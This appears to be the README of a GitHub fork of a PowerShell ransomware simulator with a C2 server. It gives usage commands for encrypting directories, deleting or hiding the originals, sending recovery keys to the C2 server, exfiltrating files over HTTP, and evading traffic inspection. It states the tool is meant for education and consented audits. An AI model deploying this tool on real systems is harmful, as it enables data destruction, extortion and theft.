<p align="center"><img width=750 alt="Farewell Ransom" src="https://github.com/BZHack/Farewell-Ransom/blob/main/Demo/RUCyberArmy.jpg"></p>

# Farewell Ransom
**Farewell Ransom** is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP.

It's a fork of the great work of JoelGMSec https://github.com/JoelGMSec/PSRansom

All communication between the two elements is encrypted or encoded so as to be undetected by traffic inspection mechanisms, although at no time is HTTPS used at any time.

# Requirements
- PowerShell 4.0 or greater

# Download
It is recommended to clone the complete repository or download the zip file.
You can do this by running the following command:
```
git clone https://github.com/BZHack/Farewell-Ransom
```


# Usage
```
.\frsm.ps1 -h

   ##################
   ##################
   ##################

   "  ----------------- by @RUCyberArmy ----------------  "

 Info:  This tool helps you simulate encryption process of a
        generic ransomware in PowerShell with C2 capabilities

 Usage: .\frsm.ps1.ps1 -e Directory -s C2Server -p C2Port
          Encrypt all files & sends recovery key to C2Server & Delete the original files
          Use -x to exfiltrate and decrypt files on C2Server

        .\frsm.ps1 -d Directory -k RecoveryKey
          Decrypt all files with recovery key string

 Usage safe:
         .\frsm.ps1 -se Directory -s C2Server -p C2Port
          Encrypt all files & sends recovery key to C2Server & Hide the original files
          Use -x to exfiltrate and decrypt files on C2Server

        .\frsm.ps1 -de Directory -k RecoveryKey
          Decrypt all files with recovery key string

 Extra parameter: -full , to change wallpaper and show a pop-up         


 Warning: All info will be sent to the C2Server without any encryption
          You need previously generated recovery key to retrieve files

```

### The detailed guide of use can be found at the following link:

TBD


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


# Credits and Acknowledgments
This tool has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec

BZHack just forked it !


# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can find us on Twitter as [@asso_bzhack](https://twitter.com/asso_bzhack) and on my blog [bzhack.bzh](https://www.bzhack.bzh/).

# TO DO

- Make encryption between client en C2Server
- Add better handle of exfill
- Add control on decrypt to make sure all files are recovered before erasing encrypted source (this is not an issue if you use the proper recovery key)
